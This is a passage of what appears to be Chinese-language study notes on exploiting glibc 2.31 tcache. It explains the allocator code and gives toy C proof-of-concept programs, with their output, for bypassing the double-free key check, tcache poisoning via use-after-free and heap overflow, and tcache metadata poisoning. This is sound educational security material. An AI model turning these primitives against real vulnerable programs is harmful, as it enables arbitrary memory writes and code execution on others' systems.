<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="algorithm-1">algorithm</h4>
<h5 id="malloc-1">malloc</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span> =&gt; __libc_malloc</span><br><span class="line">	tcache_get</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc(<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">    <span class="type">size_t</span> tbytes;</span><br><span class="line">    <span class="keyword">if</span> (!checked_request2size(bytes, &amp;tbytes))</span><br><span class="line">    &#123;</span><br><span class="line">        __set_errno(ENOMEM);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx(tbytes);</span><br><span class="line"></span><br><span class="line">    MAYBE_INIT_TCACHE();</span><br><span class="line"></span><br><span class="line">    DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">    <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)<span class="comment">//通过counts检查是否有剩余堆块,而不是通过链表是否指向空</span></span><br><span class="line">    &#123;		</span><br><span class="line">        <span class="keyword">return</span> tcache_get(tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">    DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>与glibc-2.27中区别的一点是, 2.31中判断idx对应桶子中是否有堆块,
依据是<code>tcache-&gt;counts[tc_idx] &gt; 0</code>,
不再看<code>entries</code>是否为空</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc(<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="comment">// malloc_hook</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">    <span class="type">size_t</span> tbytes;</span><br><span class="line">    <span class="keyword">if</span> (!checked_request2size(bytes, &amp;tbytes))</span><br><span class="line">    &#123;</span><br><span class="line">        __set_errno(ENOMEM);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx(tbytes);</span><br><span class="line"></span><br><span class="line">    MAYBE_INIT_TCACHE();</span><br><span class="line"></span><br><span class="line">    DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">    <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> tcache_get(tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">    DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意到tcache堆块不会有对齐检查</p>
<p>堆块从tcache中拿出来之前会将key归零, 防止泄露tcache地址</p>
<h5 id="free-1">free</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free =&gt; __libc_free</span><br><span class="line">	_int_free</span><br><span class="line">		tcache_put</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free(mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">    INTERNAL_SIZE_T size;     <span class="comment">/* its size */</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    size = chunksize(p);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line">        <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">            tcache_entry *e = (tcache_entry *)chunk2mem(p);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">               trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">               2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">               coincidence before aborting.  */</span></span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache))</span><br><span class="line">            &#123;	<span class="comment">//如果检查到e-&gt;key == tcache, 说明可能存在double free ,因为自然情况下堆块中的数据等于tcache地址概率太小了</span></span><br><span class="line">                <span class="comment">//为了避免误杀, 下面还是要再次确定一下, tcache相关桶子里是否真的有这个堆块</span></span><br><span class="line">                <span class="comment">//如果真有则说明真的double free了</span></span><br><span class="line">                <span class="comment">//也就是说e-&gt;key == tcache 是这个诊断流程的导火索</span></span><br><span class="line">                tcache_entry *tmp;</span><br><span class="line">                LIBC_PROBE(memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">                <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];<span class="comment">//从头往后遍历判断已有的堆块是不是当前要插入的堆块</span></span><br><span class="line">                     tmp;</span><br><span class="line">                     tmp = tmp-&gt;next)</span><br><span class="line">                    <span class="keyword">if</span> (tmp == e)</span><br><span class="line">                        malloc_printerr(<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">                <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">                   few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)	<span class="comment">//根据counts判断是否已经装满</span></span><br><span class="line">            &#123;</span><br><span class="line">                tcache_put(p, tc_idx);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>相比于<code>glibc-2.27</code>,
加入了放回堆块前的<code>double free</code>检查, 但是该检查很容易绕过</p>
<p>写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> * chunk = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk);</span><br><span class="line">    <span class="comment">//假设溢出修改chunkmem, 以绕过对key的检查</span></span><br><span class="line">    chunk[<span class="number">0</span>] = <span class="number">0</span>;	<span class="comment">//next</span></span><br><span class="line">    chunk[<span class="number">1</span>] = <span class="number">0</span>;	<span class="comment">//key</span></span><br><span class="line">    <span class="built_in">free</span>(chunk);</span><br><span class="line">    <span class="type">char</span> *chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">char</span> *chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk1 @ %p\n&quot;</span>,chunk1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk2 @ %p\n&quot;</span>,chunk2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test<span class="meta"># gcc 231_df.c -o 231_df -w</span></span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./<span class="number">231</span>_df</span><br><span class="line">chunk1 @ <span class="number">0x5572b2c55260</span></span><br><span class="line">chunk2 @ <span class="number">0x5572b2c55260</span></span><br></pre></td></tr></table></figure>
<h3 id="exploit">exploit</h3>
<p>glibc2.31中的利用手段,基本上都是针对next指针没有约束,
攻击者可以随便修改之</p>
<h4 id="use-after-free-导致-tcache-entry-poisoning">Use After Free 导致
tcache entry poisoning</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>]=<span class="string">&quot;flag&#123;aaaa&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> * chunk1;</span><br><span class="line">    <span class="type">size_t</span> * chunk_bait;</span><br><span class="line">    <span class="type">size_t</span> * chunk_victim;</span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    chunk_bait = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk_bait);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    chunk1[<span class="number">0</span>] = buffer;</span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    chunk_victim = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk_victim now points to %p\n &quot;</span>,chunk_victim);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# gcc uaf.c -o uaf -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./uaf</span><br><span class="line">chunk_victim now points to 0x7fff53e7c010</span><br></pre></td></tr></table></figure>
<h4 id="double-free造成重复引用">Double Free造成重复引用</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> * chunk1;</span><br><span class="line">    <span class="type">size_t</span> * chunk1_dup;</span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    chunk1[<span class="number">1</span>] = <span class="number">0</span>;      <span class="comment">//把key扬了</span></span><br><span class="line">    <span class="built_in">free</span>(chunk1);       <span class="comment">//double free</span></span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);			</span><br><span class="line">    chunk1_dup = <span class="built_in">malloc</span>(<span class="number">0x20</span>);		<span class="comment">//duplicated reference</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk1 @ %p\n&quot;</span>,chunk1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk1_dup @ %p\n&quot;</span>,chunk1_dup);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# gcc df.c -o <span class="built_in">df</span> -w </span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./df</span><br><span class="line">chunk1 @ 0x555596ef62a0</span><br><span class="line">chunk1_dup @ 0x555596ef62a0</span><br></pre></td></tr></table></figure>
<h4 id="tcache-overflow-导致-tcache-entry-poisoning">tcache overflow
导致 tcache entry poisoning</h4>
<p>可以利用堆溢出造成任意地址读写</p>
<p>1.先后连续分配两个堆块<code>chunk1</code>,<code>chunk2</code>,使其地址物理上相邻,这样<code>chunk2</code>位于内存高处,
<code>chunk1</code>可以从低处往高处溢出</p>
<p>2.释放<code>chunk2</code>使其返回到<code>tcache</code>中</p>
<p>3.从<code>chunk1</code>开始溢出,构造<code>chunk2</code>的假头,并修改<code>chunk2</code>的<code>next</code>指针指向一个希望的地址<code>target_addr</code></p>
<p>4.再分配一次,拿出<code>chunk2</code></p>
<p>5.再分配一次,拿出<code>target_addr</code></p>
<p>需要注意的是,<code>glibc2.31</code>中,判断<code>tcache</code>中是否还有堆块的依据是<code>counts[idx]</code>计数,而不是看指针是否为空</p>
<p>因此可以找炮灰堆块填线,滥竽充数一下把<code>counts</code>垫高</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015134751799.png"
alt="image-20241015134751799" />
<figcaption aria-hidden="true">image-20241015134751799</figcaption>
</figure>
<p>假设<code>chunk1</code>和<code>chunk2</code>都是<code>malloc(0x20)</code>获取的堆块,那么站在<code>chunk1_mem</code>视角上</p>
<table>
<thead>
<tr>
<th>item</th>
<th>offset based on chunk1_mem</th>
<th>value</th>
</tr>
</thead>
<tbody>
<tr>
<td>chunk1_mem</td>
<td>0</td>
<td>pad</td>
</tr>
<tr>
<td></td>
<td>…</td>
<td>pad</td>
</tr>
<tr>
<td>chunk2_prev_size</td>
<td>+ 0x20</td>
<td>pad</td>
</tr>
<tr>
<td>chunk2_size</td>
<td>+ 0x28</td>
<td>0x31</td>
</tr>
<tr>
<td>chunk2_next</td>
<td>+ 0x30</td>
<td>target_addr</td>
</tr>
<tr>
<td>chunk2_key</td>
<td>+ 0x38</td>
<td>不变</td>
</tr>
</tbody>
</table>
<p>写个poc意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[] = <span class="string">&quot;flag&#123;aaaa&#125;&quot;</span>;</span><br><span class="line">    <span class="type">size_t</span> * chunk1_mem;</span><br><span class="line">    <span class="type">size_t</span> * chunk2_mem;</span><br><span class="line">    <span class="type">size_t</span> * chunkbait;</span><br><span class="line">    <span class="type">size_t</span> * chunk2_mem_next;</span><br><span class="line">    <span class="type">size_t</span> * victim;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buffer now is %s\n&quot;</span>,buffer);</span><br><span class="line"></span><br><span class="line">    chunk1_mem = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    chunk2_mem = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    chunkbait = <span class="built_in">malloc</span>(<span class="number">0x20</span>);   <span class="comment">//炮灰</span></span><br><span class="line">    <span class="built_in">free</span>(chunkbait);</span><br><span class="line">    <span class="built_in">free</span>(chunk2_mem);</span><br><span class="line"></span><br><span class="line">    chunk2_mem_next = (<span class="type">char</span>*)chunk1_mem + <span class="number">0x30</span>;<span class="comment">//假设chunk1上overflow能覆盖chunk2 metadata</span></span><br><span class="line">    chunk2_mem_next[<span class="number">0</span>] = buffer;	<span class="comment">//buffer沾亲带故加入了tcache</span></span><br><span class="line"></span><br><span class="line">    chunk2_mem = <span class="built_in">malloc</span>(<span class="number">0x20</span>);		</span><br><span class="line">    victim = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(victim,<span class="string">&quot;flag&#123;bbbb&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buffer now is %s\n&quot;</span>,buffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行结果</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/level15.0# gcc test.c -o <span class="built_in">test</span> -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/level15.0# ./test</span><br><span class="line">buffer now is flag&#123;aaaa&#125;</span><br><span class="line">buffer now is flag&#123;bbbb&#125;</span><br><span class="line">*** stack smashing detected ***: terminated</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure>
<h4 id="tcache-entry-poisoning导致tcache-metadata-poisoning">tcache
entry poisoning导致tcache metadata poisoning</h4>
<p>之前我们<code>tcache poisoning</code>都是这样考虑的:</p>
<p>1.malloc一个堆块</p>
<p>2.free该堆块进入tcache</p>
<p>3.UAF修改该堆块的next指针,指向目标地址</p>
<p>4.malloc拿出该堆块</p>
<p>5.malloc拿出目标地址假堆块</p>
<p>我们的目光局限在了堆块上,然而实际上对堆块的投毒,也会传染给元数据,并且还会传染给后续的堆块,考虑如下场景:</p>
<p>1.利用UAF将<code>fake_chunk</code>也加入到<code>tcache</code>中</p>
<p>这个<code>fake_chunk</code>的<code>next=0xcafebabe</code>
是一个任意值, 显然不是一个合法地址</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015203432281.png"
alt="image-20241015203432281" />
<figcaption aria-hidden="true">image-20241015203432281</figcaption>
</figure>
<p>2.一个<code>malloc</code>把<code>chunk1</code>拿出来,此时桶子头指向了<code>fake_chunk</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015203623434.png"
alt="image-20241015203623434" />
<figcaption aria-hidden="true">image-20241015203623434</figcaption>
</figure>
<p>3.再一个<code>malloc</code>把<code>fake_chunk</code>拿出来,那么桶子头会继承<code>fake_chunk.next</code></p>
<p>并且<code>tcache</code>中的堆块被重新分配时,其<code>key</code>会被置零,因此<code>fake_chunk_addr</code><strong>偏移8字节处的8个字节</strong>会被置零</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015204025478.png"
alt="image-20241015204025478" />
<figcaption aria-hidden="true">image-20241015204025478</figcaption>
</figure>
<p>4.此时<code>free</code>一个同样大小的堆块进入<code>tcache</code>,由于元数据已经被投毒,新堆块会继承桶子头的<code>next</code>指针,也就是<code>0xcafebabe</code></p>
<p>此时如果有<code>chunk2</code>的<code>UAF</code>就可以泄露<code>0xcafebabe</code>这个值</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015204205909.png"
alt="image-20241015204205909" />
<figcaption aria-hidden="true">image-20241015204205909</figcaption>
</figure>
<p>写个poc意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> * chunk1;</span><br><span class="line">    <span class="type">size_t</span> * chunk2;</span><br><span class="line">    <span class="type">size_t</span> * chunk_bait;</span><br><span class="line">    <span class="type">size_t</span> fake_chunk_header[<span class="number">4</span>];</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk = (<span class="type">char</span>*)fake_chunk_header + <span class="number">0x10</span>; </span><br><span class="line">    fake_chunk[<span class="number">0</span>] = <span class="number">0xcafebabe</span>;</span><br><span class="line">    fake_chunk[<span class="number">1</span>] = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;previous fake_chunk.key = %p\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk_bait = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk_bait);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    chunk1[<span class="number">0</span>] = fake_chunk;</span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    fake_chunk = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;now fake_chunk.key = %p\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk2.next = %p\n&quot;</span>, chunk2[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
